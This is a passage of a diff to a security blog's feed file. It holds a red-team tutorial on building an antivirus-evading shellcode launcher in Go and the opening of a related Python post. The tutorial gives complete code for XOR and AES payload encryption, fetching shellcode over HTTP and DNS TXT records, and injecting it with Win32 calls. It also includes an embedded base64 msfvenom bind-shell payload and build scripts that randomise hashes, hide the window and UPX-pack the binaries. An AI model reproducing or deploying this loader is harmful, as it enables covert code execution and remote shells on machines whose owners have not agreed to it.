+upx &lt;span class=&quot;nt&quot;&gt;--brute&lt;/span&gt; launcher64.exe
+upx &lt;span class=&quot;nt&quot;&gt;--brute&lt;/span&gt; launcher32.exe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h2 id=&quot;weaponization&quot;&gt;Weaponization&lt;/h2&gt;
+
+&lt;p&gt;As you can see with the VirusTotal outcomes at the beginning of this article, these techniques do a decent job at bypassing most AVs. However, I’ve only scratched the surface here, and I haven’t offered up a polished tool to generate Launchers. Go is extremely flexible, and I can see several ways for Red Teams to weaponize these types of techniques:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;More advanced techniques for acquisition, encryption, and injection.&lt;/li&gt;
+  &lt;li&gt;A streamlined build process&lt;/li&gt;
+  &lt;li&gt;More packers for the final binary&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;There are also some very polished Go Launchers out there (&lt;a href=&quot;https://github.com/D00MFist/Go4aRun&quot;&gt;example&lt;/a&gt;, &lt;a href=&quot;https://github.com/guffre/shellcode_launcher&quot;&gt;example&lt;/a&gt;), but there’s room to grow. Let’s hope that we get there before our adversaries do.&lt;/p&gt;
+
+&lt;h2 id=&quot;conclusion&quot;&gt;Conclusion&lt;/h2&gt;
+
+&lt;p&gt;At this point, if you have been following along hopefully you learned some fun ways to encrypt, acquire, and launch shellcode using the Go programming language. Along with this, you probably learned some quick tips to building Go binaries that are a little more stealthy, and streamlined your build process with a build script. While I’ve delved a little deeper into Go than what I’ve shown here, this is a great spot to start. With this, a complete and more advanced shellcode launcher can be built with adequate AV evasion capabilities.&lt;/p&gt;
+
+&lt;p&gt;Thanks for reading. Check out my &lt;a href=&quot;https://github.com/m1kemu/MiscellaneousCode&quot;&gt;Github&lt;/a&gt; page for code snippets from this post.&lt;/p&gt;</content><author><name>Mike Music</name></author><summary type="html">I’ve started to dabble in Go a lot over the last few months, and I’m starting to see where it will fit in with Python and C# in my arsenal of commonly used programming languages for offensive tools. Thus far, I’ve developed a few shellcode Launchers that also include some simple AV/EDR evasion features. In my testing, these features have been pretty successful in evading most AV. If you’ve read my previous post on Python shellcode injection, this will be pretty similar. However, Go is generally more pleasant to work with when developing a Windows shellcode Launcher on Linux, so it won’t be as complex as the Python method I wrote about. Before getting into the specifics of the Launcher techniques, here’s a VirusTotal score for a couple of Launcher variants: Launcher with plaintext shellcode embedded. Launcher with XOR encrypted shellcode embedded (same score as unencrypted). Launcher that pulls down XOR encrypted shellcode via HTTPS. Launcher that pulls down shellcode via HTTPS and is packed with UPX. As you can see, the Launcher works pretty well, and it’s very simple. Nice. Purpose This post will cover some fun shellcode-related Launcher techniques for a shellcode Launcher written in Go. The goal is ultimately to construct a Launcher that defeats a decent number of AV/EDR technologies to launch well-known shellcode. I’ll cover: 2 Shellcode encryption methods (AES, Simple XOR) 3 Shellcode “acquisition” methods (HTTP, DNS, Embedded) 1 Shellcode execution method A few other miscellaneous techniques As with all of my blog posts, my primary motivation for doing this is to learn new techniques myself or to solidify my understanding of techniques I’ve used in the past. None of these techniques are groundbreaking or overly complex, and they’re really just a combination of other well known techniques that are widely known. But the simplicity of this is what makes it great. As with all of my code/documentation/articles, this is not to be used maliciously. Use this information for good, and follow all laws of your Nation/State/County/City/Home. Getting Started Development Environment You’re going to need a few things to get started. I’ll include what you need, why you need it, and some resources below. Windows 10 or Server 2016 VM: Used for testing the Launcher. Kali Linux VM: Has Metasploit pre-installed for shellcode generation, Go development. Go: Installed on your development host, and a novice understanding of the language itself. BASH: I’ll walk through a build script for the Go Launcher, which will require BASH and some novice BASH knowledge. A text editor: Pick whatever you prefer. I’ll be using vim and the Python Idle IDE. Resources: Legit, temporary Windows 10 VMs: Windows 10 Kali Linux: Kali Go Website: Golang Generating Shellcode For test purposes, generate generic Windows shellcode for x64 architecture using msfvenom. msfvenom -a x64 --platform windows -p windows/x64/exec cmd=calc.exe -f raw -o calc_x64.bin Encrypting the Shellcode Encrypting the shellcode is the first step towards getting the shellcode onto the target and executed without being detected. I’ll demonstrate two encryption methods in Go, but there are tons of pre-built encryption packages, and tons to be built. Simple XOR This method applies a simple XOR encryption algorithm to the shellcode (plaintext) using a provided key. In the case of this example, my key is ‘0123456789123456’ and my shellcode is the binary contents of a file containing ‘hello world’. First, define the main package and import a few standard Go packages. package main import ( &quot;io/ioutil&quot; &quot;fmt&quot; &quot;os&quot; &quot;encoding/base64&quot; ) Next, add the XOR encryption function. This function will take the key and plaintext bytes as input and return the ciphertext in byte format. func EncryptXOR(plaintext, key []byte) []byte { ciphertext := make([]byte, len(plaintext)) for i := 0; i &amp;lt; len(plaintext); i++ { ciphertext[i] = plaintext[i] ^ key[i % len(key)] } return ciphertext } Finally, implement the main function, which will perform both encryption and decryption for demonstration. Note that the shellcode file and key are being passed as command line arguments (args[1], args[2]). I’m also reading the shellcode file using ioutil.ReadFile, and printing some of the variables out for debugging purposes. func main() { args := os.Args sc_file := args[1] key := args[2] fmt.Println(&quot;\n[!] XOR Encryption&quot;) sc, _ := ioutil.ReadFile(sc_file) fmt.Println(&quot;[*] Shellcode bytes:&quot;, sc) fmt.Println(&quot;[*] Key:&quot;, key) ciphertext := EncryptXOR([]byte(sc), []byte(key)) fmt.Println(&quot;[*] Ciphertext:&quot;, ciphertext) ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext)) fmt.Println(&quot;[+] Final message:&quot;, ciphertext_b64) ciphertext, _ = base64.StdEncoding.DecodeString(ciphertext_b64) fmt.Println(&quot;[*] Message decoded:&quot;, ciphertext) plaintext := EncryptXOR(ciphertext, []byte(key)) fmt.Println(&quot;[+] Decrypted:&quot;, plaintext) } Save this as a .go file (ex: xor.go), set your GOOS and GOARCH variables (ex: export GOOS=linux; export GOARCH=amd64 for 64 bit Linux), and run it with your command line args (go run xor.go “payload.bin” “0123456789123456”). You should see output similar to that shown below. mmusic@administration:~/go_shellcode$ go run xor.go &quot;payload.bin&quot; &quot;0123456789123456&quot; [!] XOR Encryption [*] Shellcode bytes: [104 101 108 108 111 32 119 111 114 108 100 10] [*] Key: 0123456789123456 [*] Ciphertext: [88 84 94 95 91 21 65 88 74 85 85 56] [+] Final message: WFReX1sVQVhKVVU4 [*] Message decoded: [88 84 94 95 91 21 65 88 74 85 85 56] [+] Decrypted: [104 101 108 108 111 32 119 111 114 108 100 10] mmusic@administration:~/go_shellcode$ This should be enough to get your shellcode past most AVs when pulling it down, and may be able to help with shellcode embedded directly in a binary. AES Now it’s time to test out AES encryption and decryption, which is a little fancier than XOR. There will be a few extra libraries to import for this technique. package main import ( &quot;io/ioutil&quot; &quot;fmt&quot; &quot;strings&quot; &quot;os&quot; &quot;crypto/aes&quot; &quot;crypto/cipher&quot; &quot;encoding/base64&quot; &quot;time&quot; &quot;math/rand&quot; ) Now, implement some variables and functions to generate a random IV for the AES cipher. I’m using a method found here to generate the random string, which seemed to be the simplest way to do this in Go. const charset = &quot;abcdefghijklmnopqrstuvwxyz0123456789&quot; var seeded *rand.Rand = rand.New(rand.NewSource(time.Now().UnixNano())) func StringWithCharset(length int, charset string) string { b := make([]byte, length) for i := range b { b[i] = charset[seeded.Intn(len(charset))] } return string(b) } Next are the actual AES encryption and decryption functions. I’m using CFB mode for encryption, so I’m not performing any padding. This functionality is provided by the crypto/aes and crypto/cipher packages. func EncryptAES(ciphertext, plaintext, key, iv []byte) { aesBlockEncrypter, _ := aes.NewCipher([]byte(key)) aesEncrypter := cipher.NewCFBEncrypter(aesBlockEncrypter, iv) aesEncrypter.XORKeyStream(ciphertext, plaintext) } func DecryptAES(plaintext, ciphertext, key, iv []byte) { aesBlockDecrypter, _ := aes.NewCipher([]byte(key)) aesDecrypter := cipher.NewCFBDecrypter(aesBlockDecrypter, iv) aesDecrypter.XORKeyStream(plaintext, ciphertext) } Finally, add the main function. Let me break down what’s going on in this function. Assign the shellcode file path and encryption key to variables. Create a random IV 16 characters long. Read the shellcode bytes from the file (plaintext). Create the ciphertext using the plaintext, key, and IV. Base64 encode the ciphertext and IV. Create a final “message” of format [ciphertext base64::IV base64]. Perform parsing and decryption of this message to confirm functionality of crypto functions. func main() { args := os.Args sc_file := args[1] key := args[2] iv_str := StringWithCharset(16, charset) iv := []byte(iv_str)[:aes.BlockSize] fmt.Println(&quot;[!] AES Encryption&quot;) sc, _ := ioutil.ReadFile(sc_file) fmt.Println(&quot;[*] Shellcode bytes:&quot;, sc) fmt.Println(&quot;[*] Key:&quot;, key) fmt.Println(&quot;[*] IV:&quot;, iv) ciphertext := make([]byte, len(sc)) EncryptAES(ciphertext, []byte(sc), []byte(key), iv) fmt.Println(&quot;[+] Ciphertext:&quot;, ciphertext) ciphertext_b64 := base64.StdEncoding.EncodeToString([]byte(ciphertext)) iv_b64 := base64.StdEncoding.EncodeToString([]byte(iv)) s := []string{ciphertext_b64, iv_b64} msg := strings.Join(s, &quot;::&quot;) fmt.Println(&quot;[+] Final message:&quot;, msg) msg_b64_split := strings.Split(msg, &quot;::&quot;) ciphertext_b64 = msg_b64_split[0] iv_b64 = msg_b64_split[1] fmt.Println(&quot;[*] Ciphertext base64:&quot;, ciphertext_b64) fmt.Println(&quot;[*] IV base64:&quot;, iv_b64) ciphertext, _ = base64.StdEncoding.DecodeString(ciphertext_b64) iv, _ = base64.StdEncoding.DecodeString(iv_b64) fmt.Println(&quot;[*] Ciphertext bytes:&quot;, ciphertext) fmt.Println(&quot;[*] IV bytes:&quot;, iv) plaintext := make([]byte, len(ciphertext)) DecryptAES(plaintext, ciphertext, []byte(key), iv) fmt.Println(&quot;[+] Decrypted:&quot;, plaintext) } The goal of all of this code put together is to generate a final message that can be hosted almost anywhere to be pulled by a shellcode Launcher, then decrypted and injected. Now, save this code to a file (aes.go for example) and run it to test. mmusic@administration:~/go_shellcode$ go run aes.go &quot;payload.bin&quot; &quot;0123456789123456&quot; [!] AES Encryption [*] Shellcode bytes: [104 101 108 108 111 32 119 111 114 108 100 10] [*] Key: 0123456789123456 [*] IV: [114 111 111 55 120 53 52 122 54 122 116 108 57 104 109 112] [+] Ciphertext: [94 169 227 41 175 103 105 182 144 23 230 211] [+] Final message: XqnjKa9nabaQF+bT::cm9vN3g1NHo2enRsOWhtcA== [*] Ciphertext base64: XqnjKa9nabaQF+bT [*] IV base64: cm9vN3g1NHo2enRsOWhtcA== [*] Ciphertext bytes: [94 169 227 41 175 103 105 182 144 23 230 211] [*] IV bytes: [114 111 111 55 120 53 52 122 54 122 116 108 57 104 109 112] [+] Decrypted: [104 101 108 108 111 32 119 111 114 108 100 10] Acquiring the Shellcode With two encryption methods tested, and the final message containing the ciphertext formatted, it’s time to download the message. There are endless ways to do this, but I’ll cover two simple and common ones: HTTP/S and DNS. HTTP Pulling the message down using HTTP is an obvious first choice for a few reasons. It’s simple, blending in with other HTTP traffic provides some traffic obfuscation, and it’s reliable due to the need for outbound HTTP traffic in most networks. The big downside with this method is the need to add proxy configuration to the Launcher if the target network is using a web proxy. The code for an HTTP download in Go is pretty simple. First, define the main package and import some packages. package main import ( &quot;fmt&quot; &quot;net/http&quot; &quot;io/ioutil&quot; ) Now, define the main function. This code downloads the download_me.txt content from http://127.0.0.1:8080 and sets a custom user agent for the GET request. func main() { url := &quot;http://127.0.0.1:8080/download_me.txt&quot; user_agent := &quot;Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot; req, _ := http.NewRequest(&quot;GET&quot;, url, nil) req.Header.Set(&quot;User-Agent&quot;, user_agent) client := &amp;amp;http.Client{} resp, _ := client.Do(req) defer resp.Body.Close() content, _ := ioutil.ReadAll(resp.Body) fmt.Println(string(content)) } Save the code to http.go and run give it a test run while hosting an http server on port 8080 locally using something like ‘python -m SimpleHTTPServer 8080’. Make sure download_me.txt exists (in my case, it contains the aes.go output from earlier). mmusic@administration:~/go_shellcode$ go run ./http.go XhGpM70PFGJamh0q::djg1NnM3YWdmeDFxaDJrbQ== mmusic@administration:~/go_shellcode$ python -m SimpleHTTPServer 8080 Serving HTTP on 0.0.0.0 port 8080 ... 127.0.0.1 - - [12/Jul/2020 12:50:26] &quot;GET /download_me.txt HTTP/1.1&quot; 200 - DNS Pulling down shellcode via DNS is a little more fun, and versatile. Most systems will allow outbound DNS traffic, and inspection of DNS requests and responses is lacking in most organizations. DNS also doesn’t require fancy proxy configurations that may be required when using HTTP. In the example I’ll show, I’m using DNS TXT records to host the message output from aes.go. To host the shellcode in a TXT record, I’ll be using a Python project, dnsserver for my dns server. Just download this repo, install the dependencies, and run this: PORT=5053 ZONE_FILE='./example_zones.txt' ./dnserver.py Note: Because I’m using a local DNS server, the Go code will be a little different than what would actually be used in an engagement. I’ll point out that code in a moment. I’ll be adding my shellcode/ciphertext/message to the example.com TXT record. In an actual engagement, you would end up purchasing a domain and creating a TXT record with the contents using your domain registrar. Add the output of aes.go (the shellcode + iv message) to the TXT record that you’ll be pulling down. In my case, that’s for example.com. I’m adding it to the example_zones.txt file for using with dnsserver.py. Here’s my example_zones.txt file. mmusic@administration:~/dnserver$ cat example_zones.txt example.com A 1.2.3.4 example.com CNAME whatever.com example.com MX [&quot;whatever.com.&quot;, 5] example.com MX [&quot;mx2.whatever.com.&quot;, 10] example.com MX [&quot;mx3.whatever.com.&quot;, 20] example.com NS ns1.whatever.com. example.com NS ns2.whatever.com. example.com SOA [&quot;ns1.example.com&quot;, &quot;dns.example.com&quot;] example.com TXT dAD2Bb5Y4U5JGKxm::cHluaHU3OXE2Z2l1eHc5dA== Then I start the dns server. python3 ./dnserver.py Next, I created the dns.go file and added the package defition and imports. There are a few more imports this time around. import ( &quot;fmt&quot; &quot;context&quot; &quot;net&quot; &quot;time&quot; &quot;strings&quot; ) Now I create the main function. Here’s an overview of what’s going on here. Set the domain that contains the TXT record with the aes.go output. Create a custom Resolver with a Dialer that directs to 127.0.0.1:5053 (References here and here). This points the LookupTXT function to the locally running DNS server (dnsserver.py). This code will not be required in a finalized Launcher, as it will not use a local DNS server. Request the TXT record. Parse the TXT record (split on ‘::’). func main() { domain := &quot;example.com&quot; r := &amp;amp;net.Resolver{ PreferGo: true, Dial: func(ctx context.Context, network, address string) (net.Conn, error) { d := net.Dialer { Timeout: time.Millisecond * time.Duration(10000), } return d.DialContext(ctx, &quot;udp&quot;, &quot;127.0.0.1:5053&quot;) }, } txt_records, _ := r.LookupTXT(context.Background(), domain) fmt.Println(&quot;[+] TXT Record Data:&quot;, txt_records) msg_b64 := txt_records[0] msg_b64_split := strings.Split(msg_b64, &quot;::&quot;) ciphertext_b64 := msg_b64_split[0] iv_b64 := msg_b64_split[1] fmt.Println(&quot;[+] Ciphertext:&quot;, ciphertext_b64) fmt.Println(&quot;[+] IV :&quot;, iv_b64) } Add this code to dns.go, and run it. You should see the content of the TXT record containing the shellcode. mmusic@administration:~/go_shellcode$ go run dns.go [+] TXT Record Data: [dAD2Bb5Y4U5JGKxm::cHluaHU3OXE2Z2l1eHc5dA==] [+] Ciphertext: dAD2Bb5Y4U5JGKxm [+] IV : cHluaHU3OXE2Z2l1eHc5dA== Embedded The final method of shellcode acquisition is not really all that fun. It’s just embedding the encrypted shellcode into the Launcher itself for decryption. The point of including this method was really to test a ‘baseline’ against VirusTotal. I’m not going to provide demonstration code, but to embed the encrypted shellcode in your Launcher, just grab the base64 output from aes.go and assign it to a variable in the Launcher. Running the Shellcode The final step for a basic shellcode Launcher in Go is actually injecting the shellcode. This will be accomplished using the method outlined here. This involves a few steps: Use VirtualAlloc to allocate memory Use RtlCopyMemory to move the downloaded shellcode to the allocated memory region Use VirtualProtect to change the permissions on the allocated memory region Use CreateThread to create a thread that points to the shellcode Use WaitForSingleObject to stall the program until the shellcode execution is complete The VirtualProtect, RtlCopyMemory, VirtualProtect, CreateThread, and WaitForSingleObject functions are all Win32 API function within kernel32.dll and ntdll.dll, which will be imported using the Go NewLazyDLL function. Here’s some reference information to provide deeper insight into a few of the moving parts, including how VirtualProtect works. I also outlined a nearly identical process in my Python Shellcode Injection blog post, so check that out for more information. VirtualProtect RtlCopyMemory CreateThread WaitForSingleObject NewLazyDLL Info A nice article on this topic Okay, onto the code. First, define the package and import the other packages. package main import ( &quot;encoding/base64&quot; &quot;unsafe&quot; &quot;syscall&quot; ) Then, define some constants to use when calling the win32 functions. const ( MEM_COMMIT = 0x1000 MEM_RESERVE = 0x2000 PAGE_EXECUTE_READ = 0x20 PAGE_READWRITE = 0x04 ) Finally, create the main function. Here’s a breakdown of what’s happening: Creating a variable to contain some sample base64 encoded shellcode (I’m using an msfvenom tcp bind shell). Decoding the base64 into bytes. Loading the DLLs using syscall.NewLazyDLL. Defining the win32 functions that will be used. Performing the Virtualloc, RtlCopyMemory, and VirtualProtect calls to create the memory region, copy the shellcode to it, and set the memory region permissions. Calling the shellcode using CreateThread, and using WaitForSingleObject to wait for the shellcode to complete before closing the program. func main() { sc_b64 := &quot;/EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACD7AAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q==&quot; sc, _ := base64.StdEncoding.DecodeString(sc_b64) kernel32 := syscall.NewLazyDLL(&quot;kernel32.dll&quot;) ntdll := syscall.NewLazyDLL(&quot;ntdll.dll&quot;) VirtualAlloc := kernel32.NewProc(&quot;VirtualAlloc&quot;) VirtualProtect := kernel32.NewProc(&quot;VirtualProtect&quot;) RtlCopyMemory := ntdll.NewProc(&quot;RtlCopyMemory&quot;) CreateThread := kernel32.NewProc(&quot;CreateThread&quot;) WaitForSingleObject := kernel32.NewProc(&quot;WaitForSingleObject&quot;) addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;sc[0])), uintptr(len(sc))) oldProtect := PAGE_READWRITE VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&amp;amp;oldProtect))) thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0) WaitForSingleObject.Call(thread, 0xFFFFFFFF) } Note the base64 encoded shellcode in the sc_b64 variable. This is a msfvenom bind shell. Check out the commands below to see how I generated this on my Kali host. mmusic@kali:~$ msfvenom -a x64 -p windows/x64/shell_bind_tcp RHOST=0.0.0.0 LPORT=8443 -f raw -o windows_x64_bind.bin [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload No encoder specified, outputting raw payload Payload size: 505 bytes Saved as: windows_x64_bind.bin mmusic@kali:~$ base64 ./windows_x64_bind.bin -w0 /EiD5PDowAAAAEFRQVBSUVZIMdJlSItSYEiLUhhIi1IgSItyUEgPt0pKTTHJSDHArDxhfAIsIEHByQ1BAcHi7VJBUUiLUiCLQjxIAdCLgIgAAABIhcB0Z0gB0FCLSBhEi0AgSQHQ41ZI/8lBizSISAHWTTHJSDHArEHByQ1BAcE44HXxTANMJAhFOdF12FhEi0AkSQHQZkGLDEhEi0AcSQHQQYsEiEgB0EFYQVheWVpBWEFZQVpIg+wgQVL/4FhBWVpIixLpV////11JvndzMl8zMgAAQVZJieZIgeygAQAASYnlSbwCACD7AAAAAEFUSYnkTInxQbpMdyYH/9VMiepoAQEAAFlBuimAawD/1VBQTTHJTTHASP/ASInCSP/ASInBQbrqD9/g/9VIicdqEEFYTIniSIn5QbrC2zdn/9VIMdJIiflBurfpOP//1U0xwEgx0kiJ+UG6dOw74f/VSIn5SInHQbp1bk1h/9VIgcSgAgAASbhjbWQAAAAAAEFQQVBIieJXV1dNMcBqDVlBUOL8ZsdEJFQBAUiNRCQYxgBoSInmVlBBUEFQQVBJ/8BBUEn/yE2JwUyJwUG6ecw/hv/VSDHSSP/Kiw5BugiHHWD/1bvwtaJWQbqmlb2d/9VIg8QoPAZ8CoD74HUFu0cTcm9qAFlBidr/1Q== Compile this go file into an exe for your appropriate architecture. export GOOS=windows export GOARCH=adm64 go build runner.go Give it a run and confirm the shellcode exection. Creating the Launcher At this point, the picture of how the final Launcher will be composed should be clear. I’m going to take one of the encryption techniques, one of the acquisition techniques, and the execution technique and bundle them all together. This sample Launcher will: Download XOR encrypted shellcode via HTTP. Decrypt the XOR encrypted shellcode and insert into memory. Execute the shellcode using the method outlined by Ne0nd0g here. Check out the other cool injection methods that Ne0ndog has on this repo! As usual, define the package and import the used packages. package main import ( &quot;encoding/base64&quot; &quot;syscall&quot; &quot;unsafe&quot; &quot;io/ioutil&quot; &quot;fmt&quot; &quot;net/http&quot; ) Add in the constants for use in the win32 function calls. const ( MEM_COMMIT = 0x1000 MEM_RESERVE = 0x2000 PAGE_EXECUTE_READ = 0x20 PAGE_READWRITE = 0x04 ) Now, add the decryption function. In this case, XOR (encryption and decryption functions are the same for XOR). func EncryptXOR(plaintext, key []byte) []byte { ciphertext := make([]byte, len(plaintext)) for i := 0; i &amp;lt; len(plaintext); i++ { ciphertext[i] = plaintext[i] ^ key[i % len(key)] } return ciphertext } Define the main function. This is where the HTTP download happens, the decryption function is called, and the injection happens. Make sure the key defined here is the same as the key used to encrypt the payload. Also double check that the payload is hosted at the location specified in the url variable. func main() { url := &quot;http://administration.lab.mordor:8080/download_me.txt&quot; user_agent := &quot;Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36&quot; key := &quot;0123456789123456&quot; req, _ := http.NewRequest(&quot;GET&quot;, url, nil) req.Header.Set(&quot;User-Agent&quot;, user_agent) client := &amp;amp;http.Client{} resp, _ := client.Do(req) defer resp.Body.Close() content, _ := ioutil.ReadAll(resp.Body) ciphertext_b64 := content ciphertext, _ := base64.StdEncoding.DecodeString(string(ciphertext_b64)) plaintext := EncryptXOR(ciphertext, []byte(key)) sc := plaintext kernel32 := syscall.NewLazyDLL(&quot;kernel32.dll&quot;) ntdll := syscall.NewLazyDLL(&quot;ntdll.dll&quot;) VirtualAlloc := kernel32.NewProc(&quot;VirtualAlloc&quot;) VirtualProtect := kernel32.NewProc(&quot;VirtualProtect&quot;) RtlCopyMemory := ntdll.NewProc(&quot;RtlCopyMemory&quot;) CreateThread := kernel32.NewProc(&quot;CreateThread&quot;) WaitForSingleObject := kernel32.NewProc(&quot;WaitForSingleObject&quot;) addr, _, _ := VirtualAlloc.Call(uintptr(0), uintptr(len(sc)), MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE) RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&amp;amp;sc[0])), uintptr(len(sc))) oldProtect := PAGE_READWRITE VirtualProtect.Call(addr, uintptr(len(sc)), PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&amp;amp;oldProtect))) thread, _, _ := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0) WaitForSingleObject.Call(thread, 0xFFFFFFFF) } Save to launcher.go and compile. export GOOS=windows export GOOS=amd64 go build launcher.go Before testing on a Windows box, generate and host the encrypted shellcode. To generate, use the xor.go file that I demonstrated earlier. Make sure you use the same key as the one defined in launcher.go. Here’s my command, using the key shown in my launcher.go. go run ./xor.go &quot;windows_x64_bind.bin&quot; &quot;0123456789123456&quot; I added the ‘final message’ output of this to download_me.txt, and hosted it using python -m SimpleHTTPServer 8080. Now, test the Launcher. Note the console output. This is just for debugging purposes. Nice. It worked. At this point, the Launcher is complete. There are plenty of other changes that can be made, but I hope the general idea for building a quick shellcode Launcher in Go makes sense. These techniques aren’t novel, but the formula is modular enough that anyone can substitute a ‘technique’ demonstrated for something more advanced. Useful Code While writing Launchers in Go, I’ve found some neat tricks to aid in binary obfuscation and streamlining the build process. Hash Randomization It’s nice to have the hash of your binary randomized with each binary that you distribute, whether that be for testing against AV or distributing to your target. To do this, I create a ‘hash randomizer’ variable for population at build time. So long as this variable changes with each build, the binary hash will be different. Define a variable called “randomizer” somewhere in your launcher, and print it out. randomizer := &quot;\{\{ RANDOMIZER \}\}&quot; fmt.Println(&quot;[+] Randomizer: &quot;, randomizer) Now, create a build script by dropping the following into build.sh. #!/bin/bash randomizer=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1` cp launcher.go ./launcher-build.go sed -i -e &quot;s/\{\{ RANDOMIZER \}\}/$randomizer/g&quot; launcher-build.go GOOS=windows GOARCH=amd64 go build -o launcher.exe launcher-build.go Make build.sh executable, and run it. You should see the newly generated launcher.exe (with a randomized hash) and the launcher-build.go file, which includes the randomized randomization string. Key Randomization The same process as above can be applied to generate a randomized key for each build of the .exe file. This is just good opsec, and will also change the binary hash. Randomized length keys could also be a fun way to throw off the prying eyes of analysts on a campaign! Build Flags Using the ldflags command line argument when building a Go binary allows you to send specific build options to the Go linker. There are a couple of flags that I’ve been using in my Go launcher builds with success: -s and -w: Both of these string the symbol table and debug information from the binary. -H=windowsgui: This flag hides the cmd.exe program while the launcher executes (hidden window). These can be passed during the go build process as shown below. go build -ldflags=&quot;-s -w -H=windowsgui&quot; launcher.go Packing After the binary is built, I’ve been packing it using UPX. This helps against certain AVs that may catch the already stealthy launcher. It also shrinks the binaries by a considerable amount, which is great. upx --brute launcher.exe Note that using UPX with the –brute flag takes some time. Build Script Combining this all into one streamlined build script for several shellcodes, different launcher versions, or different architectures is great. The ability to easily build windows binaries on a Linux host is one of the reasons that I love Go, and creating a build script takes advantage of that capability. Here’s a sample build script that generates encrypted shellcode for two payloads, inserts a random key and randomization string into the launcher Go file, builds it, and packs it. This is just the tip of the iceberg. Take some time to experiment with a build pipeline for your launchers #!/bin/bash SHELLCODEX64=&quot;windows_x64_bind.bin&quot; SHELLCODEX86=&quot;windows_x86_bind.bin&quot; randomizer=`cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 16 | head -n 1` key=`cat /dev/urandom | tr -dc '0-9' | fold -w 16 | head -n 1` cp launcher.go ./launcher-build.go sed -i -e &quot;s/\{\{ RANDOMIZER \}\}/$randomizer/g&quot; launcher-build.go sed -i -e &quot;s/\{\{ KEY \}\}/$randomizer/g&quot; launcher-build.go GOOS=linux GOARCH=amd64 go run ./xor.go &quot;$SHELLCODEX64&quot; &quot;$key&quot; GOOS=linux GOARCH=amd64 go run ./xor.go &quot;$SHELLCODEX86&quot; &quot;$key&quot; GOOS=windows GOARCH=amd64 go build -o launcher64.exe -ldflags=&quot;-s -w -H=windowsgui&quot; launcher-build.go GOOS=windows GOARCH=386 go build -o launcher32.exe -ldflags=&quot;-s -w -H=windowsgui&quot; launcher-build.go upx --brute launcher64.exe upx --brute launcher32.exe Weaponization As you can see with the VirusTotal outcomes at the beginning of this article, these techniques do a decent job at bypassing most AVs. However, I’ve only scratched the surface here, and I haven’t offered up a polished tool to generate Launchers. Go is extremely flexible, and I can see several ways for Red Teams to weaponize these types of techniques: More advanced techniques for acquisition, encryption, and injection. A streamlined build process More packers for the final binary There are also some very polished Go Launchers out there (example, example), but there’s room to grow. Let’s hope that we get there before our adversaries do. Conclusion At this point, if you have been following along hopefully you learned some fun ways to encrypt, acquire, and launch shellcode using the Go programming language. Along with this, you probably learned some quick tips to building Go binaries that are a little more stealthy, and streamlined your build process with a build script. While I’ve delved a little deeper into Go than what I’ve shown here, this is a great spot to start. With this, a complete and more advanced shellcode launcher can be built with adequate AV evasion capabilities. Thanks for reading. Check out my Github page for code snippets from this post.</summary></entry><entry><title type="html">Defeating AV/EDR with Python</title><link href="http://localhost:4000/security/2020/05/07/python-av-evasion/" rel="alternate" type="text/html" title="Defeating AV/EDR with Python" /><published>2020-05-07T00:00:00-04:00</published><updated>2020-05-07T00:00:00-04:00</updated><id>http://localhost:4000/security/2020/05/07/python-av-evasion</id><content type="html" xml:base="http://localhost:4000/security/2020/05/07/python-av-evasion/">&lt;p&gt;Antivirus (AV) and Endpoint Detection and Response (EDR) tools have gotten a lot more advanced in recent years. Tricks that I’ve used 2 years ago to get a shell on a typical endpoint just don’t work anymore. Because of this, I’ve had to resort to trying different methods of shellcode execution on hosts. One thing that I’ve noticed is that some common AV/EDR tools fail to detect shellcode injection from Pyinstalled binaries. I don’t have a solid explanation for this, but I do have some theories based on the scarce information available on detection logic for specific AV/EDR.&lt;/p&gt;
 
 &lt;p&gt;&lt;strong&gt;Theory 1:&lt;/strong&gt; Machine Learning-based AV/EDR don’t have enough Pyinstalled binaries, especially malicious ones, to properly categorize these as malicious.&lt;/p&gt;
 
@@ -18,13 +721,13 @@
 
 &lt;h2 id=&quot;purpose&quot;&gt;Purpose&lt;/h2&gt;
 
